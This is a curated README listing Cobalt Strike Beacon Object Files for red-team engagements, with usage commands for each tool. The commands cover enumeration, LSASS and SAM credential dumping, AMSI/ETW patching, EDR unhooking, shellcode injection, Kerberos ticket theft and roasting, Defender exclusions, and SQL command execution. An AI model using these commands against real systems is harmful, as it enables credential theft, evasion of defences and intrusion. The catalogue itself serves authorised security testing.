# CobaltStrike BOF Collections
Useful Cobalt Strike Beacon Object Files (BOFs) used during red teaming and penetration testing engagements.

---
### Enumeration

- [**TrustedSec Situational Awareness BOF**](https://github.com/trustedsec/CS-Situational-Awareness-BOF)<br />
BOF that provides host enumeration and awarness commands which are more opsec friendly<br />
Example commands include:<br />
```
arp --> List arp tables
adcs_enum --> List ADCS certificate templates
env --> List environment variables
get_password_policy [domaincontroller] --> Get local or remote domain password policy
ipconfig --> Run ipconfig
listdns --> Pulls DNS cache
listpipes --> List local named pipes - Useful for creating names pipes blending in with existing ones
netstat --> Run netstat locally to view network connections
netuser [username] [opt: domain] --> Get info on user account
netGroupListMembers [groupname] [opt: domain] --> Get group members locally or from a domain group
netLocalGroupList [opt: server] --> List groups locally or on a remote system
netLocalGroupListMembers [groupname] [opt: server] --> List local group members or on a remote system
netloggedon [hostname] --> List logged on users locally or on a remote system
netshares [hostname] --> List SMB shares locally or on a remote system
netsession [opt:computer] --> List sessions locally or on a remote system
nslookup [hostname] --> Perform DNS query
routeprint --> List IPv4 routing table
tasklist --> Get local running processes
uptime --> List local system uptime
whoami --> Runs whoami /all
sc_query [opt: service name] [opt: server] --> Enumerate services locally or remotely
schtasksenum [opt: server] --> Enumerate all schedule tasks locally or remotely
schtaskscreate [opt: server] \ [USER/SYSTEM] CREATE --> Create new scheduled task - select scheduled task XML definition file in pop-up window
schtaskscreate [opt: server] \path\taskname --> Query an existing task
schtasksdelete [opt: server] \path\taskname TASK --> Delete an existing task
schtaskscreate [opt: server] \path\taskname --> Run an existing task

# LDAP search examples:
ldapsearch [query] --> Run LDAP queries in the domain
ldapsearch “(&(objectCategory=group)(name=Domain Admins))” --> Get all Domain Admins
ldapsearch “(&(&(servicePrincipalName=*)(UserAccountControl:1.2.840.113556.1.4.803:=512))(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))"” --> Get kerberoastable accounts with SPNs set
ldapsearch "(&(objectClass=user)(samaccountname=*$))" --> Get all machine accounts
ldapsearch "(objectCategory=groupPolicyContainer)" --> Get all GPOs
ldapsearch "(objectClass=trustedDomain)" --> Get domain trusts
```

- [**BOF Collection**](https://github.com/rvrsh3ll/BOF_Collection)<br />
A set of BOFs useful for enumeration and exploitation. Examples include:<br />
```
inline-execute GetDomainInfo.o --> Get domain info from DC

inline-execute GetClipboard.o --> Prints any text on the user's clipboard

enumwifi --> Enumerate wifi connections
dumpwifi Wifi_Profile_Name --> Dump wifi cleartext credentials

bofportscan 192.168.1.10 3389 --> Port scanner

inline-execute RegistryPersistence.o Install --> Install registry persistence
inline-execute RegistryPersistence.o Remove --> Remove registry persistence
```

- [**whereami**](https://github.com/boku7/whereami)<br />
A "Where Am I" BOF which is a way to run the whoami.exe binary but in an opsec safe way by pulling the info from the current Beacon process memory.<br />
Also pulls current environment variables.<br />
```whereami```

- [**RiccardoAncarani BOFs**](https://github.com/RiccardoAncarani/BOFs)<br />
A useful BOF collection to perform various tasks in a safer opsec way.
```
send_shellcode_via_pipe <pipe> <file> --> Send shellcode or any byte via a named pipe
wts_enum_remote_processes <host> --> Enumerate remote processes using WTS APIs
unhook <module>, unhook ntdll.dll --> Use direct syscalls to unhook APIs of a specific DLL (works only on 64-bit Beacons)
```

- [**Outflank C2 Tool Collection**](https://github.com/outflanknl/C2-Tool-Collection)<br />
Great list of useful tools converted to BOFs for better opsec.<br />
Tools like add machine account, kerberoast, LAPS password dump, SMB info, LDAP AD spray, and more!
```
GetMachineAccountQuota --> Get domain machine account quota
AddMachineAccount [*Computername] [Optional Password] --> Create new machine account - requires MachineAccountQuota to create new account
Domaininfo --> Enumerate AD domain
Kerberoast list --> List SPN enabled accounts
Kerberoast roast SamAccountName --> Kerberoast specific username
Lapsdump <computername> --> Dump LAPS passwowrds on remote systems within AD (requires elevated privileges on target)
Psc --> Show detailed information from processes with established TCP and RDP connections
Psw --> 	Show window titles from processes with active windows
Psx --> Show detailed information from all processes running on the system and provides a summary of installed security products and tools.
Smbinfo <compuername> --> Get SMB info of remote system instead of using CS portscan SMB
Winver --> Shows the version of Windows that is running on the local system
FindModule amsi.dll --> Identify processes which have a certain module loaded, i.e. winhttp.dll
FindProcHandle lsass.exe -->  Identify processes with a specific process handle in use, i.e. lsass.exe
PetitPotam [capture server ip or hostname] [target server ip or hostname] --> Coerce relayed auth to a target machine (or localhost)
```

- [**cobaltstrike-cat-bof**](https://github.com/tvgdb/cobaltstrike-cat-bof))<br />
Simple BOF to `cat` a file on disk.<br />
```
cat <file>
```

- [**tgtdelegation**](https://github.com/sliverarmory/tgtdelegation)<br />
Kerberos ticket delegation - Obtain usable TGTs for the current user, does not require Admin privileges!<br />
Request TGT of active user in the current domain obtained from USERDNSDOMAIN environment variable, outputs TGT blobs to .kirbi and .ccache files<br />
```
tgtdelegation currentdomain default
[+] received output:
[+] tgtdelegation succeeded!

[+] Invoking tgtParse.py to obtain a usable .ccache!

[+] Successfully decrypted the AP-REQ response!

[+] Local path to usable .ccache: /home/loki@MARVEL.LOCAL.ccache
[+] Local path to usable .kirbi: /home/loki@MARVEL.LOCAL.kirbi
```
Now use .ccache or .kirbi files offline on a Linux system to load TGT into memory: <br />
```export KRB5CCNAME=/home/loki@MARVEL.LOCAL.ccache``` <br />
Continue to use ticket in memory with other tooling of your choice through SOCKS proxy! (i.e. Impacket's `-k -no-pass` command) <br />


- [**PrivKit**](https://github.com/mertdas/PrivKit)<br />
Windows privilege escalation BOF kit used for detecting priv esc vulnerabilities including unquoted service paths, hijackable paths, autologon registry keys, etc.<br />
Check for all vulnerabilities supported: <br />
```privcheck```

- [**enumfiles BOF**](https://github.com/wsummerhill/BOF-enumfiles)<br />
Simple BOF I developed in C++ to quickly enumerate local files of interest for post-exploitation. Useful to help find potential LOLbins, remoting software, browser or web server installations, etc.<br />
```
enumfiles show --> Dont run checks, just show all enumeration checks and files/folders supported
enumfiles all --> Run all enumeration checks
enumfiles lolbins --> Run only lolbins checks
enumfiles browser-userdata --> Run only browser user data
enumfiles remoting --> Run only remoting software checks
enumfiles webservers --> Run only webserver checks
...
```

- [**xPipe**](https://github.com/boku7/xPipe)<br />
Made by Bobby Cooke to list all active pipes on a local system and return their DACL permissions. Useful for finding pipe names to create similar pipes when using SMB Beacons.<br />
```
xpipe --> List all the pipes
xpipe \\.\pipe\lsass --> List a specific pipe and show its owner & DACL permissions
```

---
### Executing .NET Assemblies

- [**InlineExecute-Assembly**](https://github.com/anthemtotheego/InlineExecute-Assembly)<br />
Perform .NET assembly execution of any .NET executable without any prior modifications required<br />
The BOF also supports several flags to disabling AMSI via in memory patching, disabling and restoring ETW via in memory patching, or customization of the CLR App Domain name to be created<br />
```inlineExecute-Assembly --dotnetassembly /home/Seatbelt.exe --assemblyargs AntiVirus AppLocker --etw --amsi --mailslot totallyLegitMailslot```

- [**inject-assembly**](https://github.com/kyleavery/inject-assembly)<br />
Another alternative .NET executable loader to inject an assembly into a running process<br />
```inject-assembly 0 /home/Rubeus.exe [args...]```

- [**BOF.NET**](https://github.com/CCob/BOF.NET)<br />
Critical tool for red teams that allows you to run .NET assemblies as BOFs within the Beacon process<br />
```
bofnet_init --> Start BOF.NET
bofnet_listassemblies --> List loaded .NET assemblies
bofnet_load /Path/To/Assembly.exe --> Load assembly
bofnet_execute bof_name [args] --> Execute assembly
bofnet_shutdown --> Kill BOF.NET
```

- [**Modified BOF.NET**](https://github.com/williamknows/BOF.NET/tree/main)<br />
Updated BOF.NET repo with the added `bofnet_executeassembly` command to easily call .NET assemblies<br />
```
bofnet_init --> Start BOF.NET
bofnet_load /Path/To/Assembly.exe --> Load assembly
bofnet_executeassembly AssemblyName arg1 arg2 arg3 --> Execute .NET assembly
bofnet_executeassembly Seatbelt -group=remote --> SeatBelt execution example
bofnet_shutdown --> Kill BOF.NET
```

---
### Exploitation

- [**ajpc500 BOFs**](https://github.com/ajpc500/BOFs)<br />
A collection of **very** useful BOFs for various utilities including different techniques of shellcode injection with syscalls, process dumping (LSASS!), and patching ETW for better evasion.<br />
```
etw stop --> Patch etw
syscalls_inject <PID> <listener_name> / syscalls_shinject <PID> <path_to_bin> --> Syscalls shellcode injection
syscalls_spawn <listener> / syscalls_shspawn <path_to_bin> --> Spawn and syscalls injections
static_syscalls_apc_spawn <listener> / static_syscalls_apc_spawn <path_to_bin> --> Spawn and static syscalls shellcode njection (NtQueueApcThread)
static_syscalls_inject <PID> <listener_name> / static_syscalls_shinject <PID> <path_to_bin> --> Static syscalls shellcode injection (NtCreateThreadEx)
static_syscalls_dump <PID> [path_to_output] --> Process dump with syscalls (i.e. Dump LSASS!)
```

- [Threadless Inject BOF](https://github.com/iilegacyyii/ThreadlessInject-BOF)
This process injection BOF has to be used by remotely hooking a function and specify which DLL/function you want to target for injecting shellcode into. <br />
```
threadless-inject <pid> <dll> <export function> <shellcode path>
threadless-inject 1234 ntdll.dll NtOpenFile shellcode.bin --> Inject into existing process
```
  
- [**MiniDumpWriteDump**](https://github.com/rookuu/BOFs)<br />
Uses static syscalls to dump a process such as LSASS to output file<br />
```minidumpwritedump <PID> <path_of_dmp?>```

- [**SilentLsassDump**](https://github.com/josephkingstone/BOFs-2/)<br />
Uses direct syscalls generated from [https://github.com/outflanknl/InlineWhispers](InlineWhispers)<br />
Dump the LSASS process via the silent process exit mechanism into the C:\Temp directory<br />
```silentLsassDump <LSASS PID>```

- [**RegSave BOF**](https://github.com/EncodeGroup/BOF-RegSave)<br />
BOF to dump SAM, SYSTEM, and SECURITY database from a local system. <br />
```
bof-regsave c:\temp\ --> Dumps SAM database files to target folder C:\temp\
```

- [**Unhook BOF**](https://github.com/rsmudge/unhook-bof)<br />
Created by Raphael Mudge, this BOF will attempt to unhook userland APIs to bypass EDR<br />
Sort of the "hail mary" for attempting to unhook APIs<br />
 ```unhook```

- [**WdToggle**](https://github.com/outflanknl/WdToggle)<br />
Enables WDigest credential caching using direct system calls<br />
Bypasses Windows Credential Guard if enabled<br />
```
inline-execute WdToggle.o --> First enable WdDigest caching
logonpasswords --> Second, wait for users to login and then run Mimikatz to dump their newly cached cleartext passwords
```

- [**TrustedSec CS-Remote-OPs-BOF**](https://github.com/trustedsec/CS-Remote-OPs-BOF)<br />
Great repo of new BOFs from TrustedSec to follow up their SituationalAwareness BOFs.<br />
Includes dumping a process, decrypting Chrome keys, persistence techniques (registry, scheduled tasks, services), and more!
```
adcs_request --> Request an enrollment certificate
procdump --> Dump specified process to output file
reg_set --> Set/create a registry key
sc_create --> Create a new service
schtaskscreate --> Create a new scheduled task
setuserpass --> Set a users password
```

- [**Inject AMSI Bypass**](https://github.com/boku7/injectAmsiBypass)<br />
BOF that bypasses AMSI in a remote process with code injection<br />
```inject-amsiBypass <PID>```

- [**Inject ETW Bypass**](https://github.com/boku7/injectEtwBypass)<br />
Inject ETW Bypass into Remote Process via Syscalls<br />
```injectEtwBypass <PID>```

- [**Kerberoast BOF**](https://github.com/cube0x0/BofRoast)<br />
BOF for targeted Kerberoasting against input SPN to roast<br />
Returns TGS that you can pass to apreq2hashcat.py (provided in repo) to output the hashcat format<br />
```kerberoast SPN/HOSTNAME.domain.local```

- [**Koh**](https://github.com/GhostPack/Koh)<br />
GhostPack BOF that allows for the capture of user credentials via purposeful token/logon session leakage.<br />
Koh has a BOF client for capturing logon tokens in Cobalt Strike and a C# capture server to negotiate captured tokens for new logon sessions.<br />
```
# Koh client BOF
help koh
  koh list              - lists captured tokens
  koh groups LUID       - lists the group SIDs for a captured token
  koh filter list       - lists the group SIDs used for capture filtering
  koh filter add SID    - adds a group SID for capture filtering
  koh filter remove SID - removes a group SID from capture filtering
  koh filter reset      - resets the SID group capture filter
  koh impersonate LUID  - impersonates the captured token with the give LUID
  koh release all       - releases all captured tokens
  koh release LUID      - releases the captured token for the specified LUID
  koh exit              - signals the Koh server to exit

koh list --> List current logon sessions
koh impersonate <LUID> --> Impersonate a logon session from above output

ls \\dc.theshire.local\C$ --> Use the impersonated privileged logon session to interact with a target system
```

- [**Kerbeus-BOF**](https://github.com/RalfHacker/Kerbeus-BOF)
The first Rubeus BOF implementation released in November 2023 which has integration with Cobalt Strike and Havoc!<br />
```
help kerbeus --> Show help menu

# Ticket requests
krb_asktgt /user:USER /password:PASSWORD [/domain:DOMAIN] [/dc:DC] [/enctype:{rc4|aes256}] [/ptt] [/nopac] [/opsec] --> Ask TGT
- krb_asktgt /usr:domainadmin /password:SuperSecure123
krb_asktgs /ticket:BASE64 /service:SPN1,SPN2 [/domain:DOMAIN] [/dc:DC] [/tgs:BASE64] [/targetdomain:DOMAIN] [/targetuser:USER] [/enctype:{rc4|aes256}] [/ptt] [/keylist] [/u2u] [/opsec] --> Ask TGS
- krb_asktgs /ticket:<BASE64> /service:HTTP/dc1.domain.com,CIFS/dc1.domain.com /opsec
krb_renew /ticket:BASE64 [/dc:DC] [/ptt] --> Renew TGT

# Ticket management
krb_ptt /ticket:BASE64 [/luid:LOGONID] --> Pass-the-ticket in current logon session
krb_purge [/luid:LOGONID] --> Purge all tickets or specific ticket
krb_describe /ticket:BASE64 --> Describe a ticket
krb_klist [/luid:LOGINID] [/user:USER] [/service:SERVICE] [/client:CLIENT] --> Klist command to list tickets
krb_dump [/luid:LOGINID] [/user:USER] [/service:SERVICE] [/client:CLIENT] --> Dump tickets for current user (non-privileged) or for all users (requires SYSTEM)
krb_triage [/luid:LOGINID] [/user:USER] [/service:SERVICE] [/client:CLIENT] --> Output table of all tickets
krb_tgtdeleg [/target:SPN] --> Get current user ticket from memory without requiring admin privs

# Roasting
krb_kerberoasting /spn:SPN [/nopreauth:USER] [/dc:DC] [/domain:DOMAIN] --> Kerberoast
krb_asreproasting /user:USER [/dc:DC] [/domain:DOMAIN] --> AS-REP roast

# Miscellaneous
krb_hash /password:PASSWORD [/user:USER] [/domain:DOMAIN] --> Generate RC4-hmac (NTLM) hash of password
krb_changepw /ticket:BASE64 /new:PASSWORD [/dc:DC] [/targetuser:USER] [/targetdomain:DOMAIN] --> Change current user password using MS kpasswd password change
```

- [**Cobalt-Clip**](https://github.com/DallasFR/Cobalt-Clip)<br />
A clipboard add-on for Cobalt Strike to interact with the victim's clipboard. With Cobalt-Clip you can dump, edit and monitor the content of a clipboard.<br />
```
dumpclip --> Dump current contents of clipboard
set-clipboard-data --> Modify victims clipboard data
clipmon --> Monitor the clipboard for new content and output to console
```

- [**BOF-patchit**](https://github.com/ScriptIdiot/BOF-patchit/)<br />
A very easy solution to patch AMSI or ETW. Patches AMSI/ETW for the currently running x64 process.
```
patchit check --> List if AMSI or ETW are currently patched
patchit all --> Patch both AMSI and ETW
patchit amsi --> Only patch AMSI
patchit etw --> Only patch ETW

# DO NEFARIOUS STUFF HERE....

patchit revertAll --> Revert both AMSI and ETW
patchit revertAmsi --> Revert only AMSI
patchit revertEtw --> Revert only ETW
```

- [**ScreenshotBOF**](https://github.com/CodeXTF2/ScreenshotBOF)<br />
Uses WinAPI and avoids fork&run to take a screenshot.<br />
`screenshot_bof output.bmp 1`

- [**nanorobeus**](https://github.com/wavvs/nanorobeus)<br />
BOF equivalent of Rubeus for managing Kerberos tickets. It can be used cross-platform for multiple C2s including Cobalt Strike, Sliver and Brute Ratel.<br />
```
nanorobeus luid --> Get logon current ID
nanorobeus klist --> List all Kerberos tickets
nanorobeus dump /all --> Dump all Kerberos tickets, requires local admin privileges
nanorobeus kerberoast /spn:HTTP/server.fortress.local --> Kerberoast a specific SPN
nanorobeus ptt /ticket:<kirbi-base64> --> Pass-the-ticket
```

- [**Defender-Exclusions-Creator**](https://github.com/EspressoCake/Defender-Exclusions-Creator-BOF)<br />
Easily create, add, or remove Windows Defender exclusions using this BOF. Supports "Add/Remove" methods and exclution types "Path/Process/Extension".<br />
```
# Help
cEnumDefenderException (add|remove) (extension|path|process) thing_to_add_or_remove_exception_for [optional computer name]

# Examples - Local
cEnumDefenderException add extension .tmp
cEnumDefenderException add path C:\windows\temp\
cEnumDefenderException add process NotMalicious.exe

# Example - Remotely
cEnumDefenderException add path C:\users\USERNAME\Downloads\ HOSTNAME.domain.local
``` 

- [**SQL-BOF**](https://github.com/Tw1sm/SQL-BOF)<br />
BOFs to interact with SQL servers without having to use .NET assemblies.
```
# Get info on a SQL server
sql-info <SERVER>
sql-links <SERVER> -> Enum linked servers

# Exec commands on SQL server
sql-whoami <SERVER> --> Gather logged in user, mapped user and roles
sql-olecmd <SERVER> [command] [opt:database] --> Exec command via OLE automation procedures
sql-xpcmd <SERVER> [command] [opt:database] --> Exec command via xp_cmdshell
sql-agentcmd <SERVER> [command] [opt:database] --> Exec command via agent jobs

# Exec custom SQL query
sql-query <SERVER> [query] [opt:database]

# Enum databases or columns on a server
sql-databases <SERVER> [opt:database]
sql-tables <SERVER> [opt:database]
sql-columns <SERVER> TableName [opt:database]

# Enable/disable xp_cmdshell
sql-enablexp <SERVER>
sql-disablexp <SERVER>
```

---
### Miscellaneous
- [**BOF Template**](https://github.com/Cobalt-Strike/bof_template)<br />
Used for creating your very own BOFs!

- [**Cobalt Strike Blog: Simplifying BOF development**](https://www.cobaltstrike.com/blog/simplifying-bof-development)<br />
BOFs in Cobalt Strike can now be written in C++ as of August, 2023.

- [**BOF Hound**](https://github.com/fortalice/bofhound)<br />
An offline BloodHound ingestor and LDAP parser to be used with TrustedSec's ["ldapsearch"](https://github.com/trustedsec/CS-Situational-Awareness-BOF).<br />
Use ldapsearch in Cobalt Strike to gather data and then use bofhound on your CS logs to generate JSON files for importing into BloodHound.<br />
```bofhound -o /data/```

- [**Help Color**](https://github.com/outflanknl/HelpColor)<br />
Color helper Aggressor script for coloring "help" output based on command type and OPSEC<br />
```helpx```

- [**Hidden Desktop BOF**](https://github.com/WKL-Sec/HiddenDesktop)<br />
Uses VNC connection and server to create a hidden remote desktop connection to your target instead of using RDP. <br />
```
Start the HVNC server first
HiddenDesktop <server> <port> --> Start a hidden desktop client connection to your listening server
hd-launch-explorer --> Then start the Windows explorer browser which should pop up a new window on your system
```
